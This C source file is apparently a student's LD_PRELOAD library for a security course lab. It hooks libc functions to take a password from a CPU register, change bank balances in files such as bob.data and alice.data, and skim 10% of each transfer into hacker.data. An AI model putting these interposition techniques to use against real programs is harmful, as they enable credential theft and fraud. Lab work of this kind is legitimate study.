#include<stdint.h>
#include<stdio.h>
#include<stdlib.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<stdarg.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();
void openBob(int fd,const char *filename);
void openAlice(int fd,const char *filename);
void closeBob();
void closeAlice();
int getBobFd();
int getAliceFd();
int getBobBalance();
void setBobBalance(int balance);
int getAliceBalance();
void setAliceBalance(int balance);
void setTask(int t);
int getTask();
void setDesc3(int val);
int getDesc3();
void setDesc4(int val);
int getDesc4();
void setTransfer(int val);
int getTransfer();

/*
void setNumOpenFiles(int num);
int getNumOpenFiles();
void openSenderFile(char *pathname, int fd);
char *getSenderFileName();
int getSenderFD();
void setSenderBalance(int b);
int getSenderBalance();
void closeSenderFile();
void openReceiverFile(char *pathname, int fd);
char *getReceiverFileName();
int getReceiverFD();
void setReceiverBalance(int b);
int getReceiverBalance();
void closeReceiverFile();
*/
void openFile(char *pathname, int fd, int balance);
int getOpenFileFD(int index);
char *getOpenFileFilename(int index);
void closeFile(int index);
void setOpenFileBalance(int index, int bal);
int getOpenFileBalance(int index);

static int ignoreMalloc = 0;
int inclose = 0;
int inopen = 0;

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}


int fscanf(FILE *stream, const char *format, ...){
//	printf("in  fscanf\n");	
	static int (*origFscanf)(FILE *,const char *, ...) = NULL;
	if(!origFscanf)
	{
		origFscanf = (int (*)(FILE*,const char*,...))dlsym(RTLD_NEXT, "fscanf");
	}	
	int count;
	va_list ap;
	va_start(ap, format);
	if(strcmp(format, "%ms") == 0){ //Password call
		register char* reg asm("r13");
		char **b = va_arg(ap, char**);
		char **buff = b;
		*buff =(char *)malloc(sizeof(char)*20); 
		strcpy(*buff, reg);
		count = 1;
	}
	else { //Call scanf properly
		count = origFscanf(stream, format, va_arg(ap, int*));
	}
	va_end(ap);
	return count;
}


//Task 2

int open(const char *pathname, int flags, ...){
	va_list ap;
	va_start(ap, flags);
	int mode;
			
	static int (*origOpen)(const char *, int, ...) = NULL;
	if(!origOpen)
	{
		origOpen = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");
	}
	
	int fd;
	//printf("%s opened\n",pathname);
	//Task t
	/*
	if((getTask() == 3) && (getNumOpenFiles() < 2)){ //Task 3 - opening a file
		if(getNumOpenFiles() == 0){ //Currently trying to open the sender file
			setNumOpenFiles(1);
			openSenderFile((char *)pathname, 10);
			return 10; //Return as FD so doesnt overlap any files I open
		}
		else if(getNumOpenFiles() == 1){
			openReceiverFile((char *)pathname, 11);
			setNumOpenFiles(2);
			return 11; //Return as FD so doesnt overlap any file I open
		}
	}
	*/

	//Task 3
	inopen =1; //To stop infinite recursion
	if((getTask() == 3) && (inclose == 0)){
		if(strcmp(pathname,"bob.data") ==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,0,bal);
			return 3;
		}else if(strcmp(pathname, "alice.data") ==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname, 1, bal);
			return 3+(2*1);
		}else if(strcmp(pathname,"rick.data")==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,2, bal);
			return 3+(2*2);
		}else if(strcmp(pathname, "morty.data")==0){
			int real_fd = origOpen(pathname, flags); //, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,3, bal);
			return 3+(2*3);
		}else if(strcmp(pathname, "picard.data")==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,4, bal);
			return 3+(2*4);
		}else if(strcmp(pathname, "kirk.data")==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,5, bal);
			return 3+(2*5);;
		}else if(strcmp(pathname,"student.data")==0){
			int real_fd = origOpen(pathname, flags);//, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,6, bal);
			return 3+(2*6);
		}else if(strcmp(pathname,"hacker.data")==0){
			int real_fd = origOpen(pathname, flags, va_arg(ap,int));
			char buff[20];
			memset(buff, '\0',20);
			read(real_fd, buff, 20);
			int bal = atoi(buff);
			close(real_fd);
			openFile(pathname,7, bal);
			return 3+(2*7);
		}
	}
	if((mode =va_arg(ap,int)) <=  0){
		fd =origOpen(pathname, flags);
	}
	else{
		fd =origOpen(pathname, flags, mode);
	}
	//printf("va_arg returned :%d \n", mode);

	//Set the task number which is opened for each task
	int t = atoi(pathname);
	if(t == 4){
		setTask(t);
	}
	if(t == 3){
		setTask(t);
	}
	return fd;
}


FILE *fopen(const char *pathname, const char *mode){

//	printf("in fopen pathname: %s \n", pathname);
	static FILE *(*origFopen)(const char *, const char *) = NULL;
	FILE *retval;
	if(!origFopen)
	{
		origFopen = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen");
	}

	retval = origFopen(pathname, mode);

	//Task 2
	int fd = fileno(retval);
	if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
		openBob(fd, pathname);	
	//	printf("open bob \n");

	}
	if(strcmp(pathname, "alice.data") == 0){
		openAlice(fd, pathname);
	//	printf("open alice \n");
	}

	//Task 4
	int t = atoi(pathname);
	if(t == 4){
		setTask(t);
	}

	return retval;


}

/*
pid_t fork(void){

	static pid_t (*origFork)(void) = NULL;
	origFork = (pid_t(*)(void))dlsym(RTLD_NEXT, "fork");


}*/

int close(int fd){
	int retval;
	static int (*origClose)(int) = NULL;
	//if(!origClose){
		origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
	//}
	
	
	/*
	if(getTask() == 3 && getNumOpenFiles() > 0){
		if(fd == getSenderFD()){
			closeSenderFile();
			return 0; //0 is returned on success
		}
		else if(fd == getReceiverFD()){
			closeReceiverFile();
			return 0; //0 is returned on success of close
		}
	}*/
			
	printf("in close\n");	

	//Task 3
	inclose =1; //To stop infinite recursion

	if((getTask() == 3) && (inopen == 0)){
		if((fd >= 4) && (fd <= 11)){
			char *pathname = getOpenFileFilename(fd);
			int real_fd =open(pathname, O_RDWR);
			ftruncate(real_fd, 0);
			lseek(real_fd, 0, SEEK_SET);
			char balance[20];
			memset(balance, '\0',20);
			sprintf(balance, "%d", getOpenFileBalance(fd));
			int nbytes = strlen(balance);
			write(real_fd, balance, nbytes);
			int ret = close(real_fd);
			return ret;;
		}
		/*else if(fd ==1){
			return 1;
		}else if(fd ==2){
			return 2;
		}else if(fd==3){{
			return 3;
		}else if(fd==4){
			return 4;
		}else if(fd ==5){
			return 5;
		}else if(fd ==6){
			return 6;
		}else if(fd ==7){
			return 7;
		}*/
	}

	retval = origClose(fd);
	
	closeBob(fd);
	closeAlice(fd);
	return retval;

}



ssize_t write(int handle, const void *buffer, size_t nbyte){
	static int (*origWrite)(int,const void*, size_t) = NULL;
	int retval;
	//if(!origWrite)
	//{
		origWrite = (int (*)(int,const void*, size_t))dlsym(RTLD_NEXT, "write");
	//}

	//If writing to bob and alice - must change their buffers before writing 
	

	//Task 3
	printf("in write \n");
	int t = getTask();
	if(getTask() == 3){
		if((handle >= 4) && (handle <= 11)){
			int bal = atoi(buffer);
			setOpenFileBalance(handle, bal);
			int nbytes = strlen((char *)buffer);
			return nbytes; //RIGHT NUMBER - DOES IT MATTER?
		}
	}
/*	if(t == 3){
		int fd;
		int ret;
		printf("handle is %d\n",handle);
		printf("getSenderFD is %d\n",getSenderFD());
		if(handle == getSenderFD()){
			char *pathname = getSenderFileName();
			fd =open(pathname, O_RDWR);
			ftruncate(fd, 0);
			lseek(fd, 0, SEEK_SET);
			printf("Writing %s to %s\n",buffer, pathname);
			ret = origWrite(fd, buffer, nbyte);
			close(fd);
			return ret;
		}
		else if(handle == getReceiverFD()){
			char *pathname = getReceiverFileName();
			fd =open(pathname, O_RDWR);
			ftruncate(fd, 0);
			lseek(fd, 0,  SEEK_SET);
			printf("Writing %s to %s\n",buffer, pathname);
			ret = origWrite(fd, buffer, nbyte);
			close(fd);
			return ret;
		}
	}*/
	//Task 4
	//else 
	if(t == 4){
		if(handle == 3) { //The file getting the transfer	
			int updated_value = atoi(buffer);
	//		printf("updated val in handle == 3 is %d \n",updated_value);
			int prev_val = getDesc3();
			int transfer_amount= prev_val - updated_value;
						
			setTransfer(transfer_amount);
			retval = origWrite(handle, buffer, nbyte);
			return retval;
		}
		else if(handle ==4){
			int prev_val = getDesc4();
			int transfer_amount = getTransfer();
			//Calculate how much to send to hacker
			int transfer_to_hacker =(transfer_amount*0.10);
			//Calculate how much to send to receiver
			transfer_amount -= transfer_to_hacker;

			//Transfer to hacker
			int hacker_fd;
		
			char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
			memset(hacker_val, '\0', 20);
			hacker_fd = open("hacker.data", O_RDWR);
			lseek(hacker_fd, 0, SEEK_SET);
			read(hacker_fd, hacker_val, 20);
			int hack_val = atoi(hacker_val);
//			printf("hacker val -> int is %d\n",hack_val);
			hack_val += transfer_to_hacker; //Add to hacker ;
			memset(hacker_val, '\0', 20);
			sprintf(hacker_val, "%d", hack_val);
			int amount_to_write = strlen(hacker_val);
			ftruncate(hacker_fd, 0);
			lseek(hacker_fd, 0, SEEK_SET);
	//		printf("amount to write is %d \n",amount_to_write);			
	//		printf("hacker val read in is: %s\n", hacker_val);
			origWrite(hacker_fd, hacker_val, amount_to_write);
			close(hacker_fd);

			//Update value of receiver
			int write_amount = prev_val + transfer_amount;
	//		printf("receiver value is :%d \n", write_amount);
			char write_amount_to_4[20];
			memset(write_amount_to_4, '\0', 20);
			sprintf(write_amount_to_4, "%d", write_amount);
			int nbytes = strlen(write_amount_to_4);
	//		printf("nbytes for reciver: %d\n", nbytes);
			retval = origWrite(handle, write_amount_to_4, nbytes);
			return retval;
		}

	}


	//Task 2
	int bob_fd = getBobFd(); 
	int alice_fd = getAliceFd(); 
	if((bob_fd != -1) && (alice_fd != -1)){ //Bob and Alice are  open
		int bob_balance = getBobBalance();
		int alice_balance = getAliceBalance();
		int amount_left_in_bob;
		if(bob_balance <= 0){
			if(handle == bob_fd){
				char buf[20];
				sprintf(buf, "%d", bob_balance);
				int nbyte = strlen(buf);
				retval = origWrite(handle, buf, nbyte); 
				return retval;
			}
			else if(handle == alice_fd){
				char buf[20];
				sprintf(buf, "%d", alice_balance);
				int nbyte = strlen(buf);
				retval = origWrite(handle, buf, nbyte); 
				return retval;
			}

		}
		else{
			if(handle == bob_fd){ //Bob is Open
				char buf[21];
				if(bob_balance == -1){
					printf("Error: cannot get bobs balance");
					exit(1);
				}						
	//			printf("in read if - buf is %s \n", buf);
				int nbyte;
				if(bob_balance < 100){
					sprintf(buf, "%d",0);
					nbyte = strlen(buf);
				}
				
				//int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
				//if(diff == 100){
				else{
	//				printf("in diff == 100 \n");
					sprintf(buf, "%d", bob_balance-100);
	//				printf("new buff is %s \n", buf);
					nbyte = strlen(buf);
				}
				retval = origWrite(handle, buf, nbyte); 
				return retval; //Break out of function
				//}
				
			}else if(alice_fd == handle){ //Alice is Open
				char buf[20];
	//			printf("in alice if \n");
				int curr_bal = atoi(buffer);
				int diff =  alice_balance - curr_bal;
				int orig = alice_balance;
				int nbyte;
				if(bob_balance < 100){
					sprintf(buf, "%d", orig+bob_balance);
					nbyte = strlen(buf);
				}else{	
					sprintf(buf, "%d", orig+100);
					nbyte = strlen(buf);
				}
				retval = origWrite(handle, buf, nbyte);
				return retval; //Break out of function
			}
		}
	}
	retval = origWrite(handle, buffer, nbyte);
	return retval;
}


ssize_t read(int handle, void *buf, size_t nbyte){
	static int (*origRead)(int,void*, size_t) = NULL;
	int retval;
//	if(!origRead)
//	{
		origRead = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "read");
//	}

	memset(buf, '\0', nbyte);

	//Task 3
	if(getTask() == 3){
		if((handle >= 4) && (handle <= 11)){
			return strlen(buf); //RIGHT NUMBER - DOES IT MATTER?
		}
	}
		/***char *pathname = getOpenFileFilename(handle);
	}		int real_fd =open(pathname, O_RDWR);
			ftruncate(real_fd, 0);
			lseek(real_fd, 0, SEEK_SET);
			char balance[20];
			memset(balance, '\0',20);
			sprintf(balance, "%d", getOpenFileBalance());
			int nbytes = strlen(balance);
			write(real_fd, balance, nbytes);
			int ret = close(real_fd);
			return ret;;
		}*/
		/*else if(fd ==1){
			return 1;
		}else if(fd ==2){
		
		if(handle == 10){ //FD number for Sender
			char *senderFileName = getSenderFileName();
			int fd = open(senderFileName, O_RDWR);
			char senderBuff[20];
			memset(senderBuff, '\0', 20);
			int ret = read(fd, senderBuff, 20);
			int balance = atoi(senderBuff);
			setSenderBalance(balance);
			close(fd);
			return ret;
		}
		else if(handle == 11){
			char *receiverFileName = getReceiverFileName();
			int fd = open(receiverFileName, O_RDWR);
			char receiverBuff[20];
			memset(receiverBuff, '\0', 20);
			int ret = read(fd, receiverBuff, 20);
			int balance = atoi(receiverBuff);
			setReceiverBalance(balance);
			close(fd);
			return ret;
		}
	} */

	retval = origRead(handle, buf, nbyte);

	//printf("read in %s \n", buf);


	//Task 2
	int bobFd = getBobFd();
	int aliceFd = getAliceFd();
	if((bobFd != -1) && (aliceFd != -1)){ // Alice and Bob are open
		int bal = atoi(buf);
		//int bal = atoi(temp_buff);
		if(handle == aliceFd){
			setAliceBalance(bal);
		}
		else if(handle == bobFd){
			setBobBalance(bal);
		}
	}
			
	//Task 4
	int t = getTask();
	if(t == 4){
		
		int prev_val = atoi(buf);
		if(handle == 3){ //Set prev value for the sender (fd == 3)
			setDesc3(prev_val);
		}
		else if(handle == 4){ //Set prev value for the receiver (fd == 4)
			setDesc4(prev_val);
		}
	}
	
	return retval;
	
}

//Task 3
off_t lseek(int fd, off_t offset, int whence){
	static off_t (*origLseek)(int,off_t,int) = NULL;
	off_t retval;
	origLseek = (off_t (*)(int, off_t, int))dlsym(RTLD_NEXT, "lseek");
	
	if(getTask() == 3){
		if((fd >=4 )&& (fd <= 11)){ //Fake behavior
			retval = offset;
			return retval;
		}
	}
	retval = origLseek(fd, offset, whence);		
	return retval;
}





//Task 3
int ftruncate(int fd, off_t length){
	static int (*origFtruncate)(int, off_t) = NULL;
	int retval;
	origFtruncate = (int (*)(int, off_t))dlsym(RTLD_NEXT, "ftruncate");
	
	if(getTask() == 3){
		if((fd >= 4) && (fd <= 11)){ //Fake behavior
			retval = 0; //0 Returned on success`
			return retval;
		}
	}
	retval = origFtruncate(fd, length);;		
	return retval;
	
}

/*
int fcntl(int fd, int cmd, ...){
	printf("in fcntl\n");
	static int (*origFcntl)(int fd, int cmd, ...) = NULL;
	origFcntl = (int (*)(int, int, ...))dlsym(RTLD_NEXT, "fcntl");
	int retval;

	if(getTask() == 3){
		if((fd >= 0) && (fd < 8)){		
			return O_RDWR;
		}
	}
	
	retval = origFcntl(fd, cmd);
	return retval;


}
*/




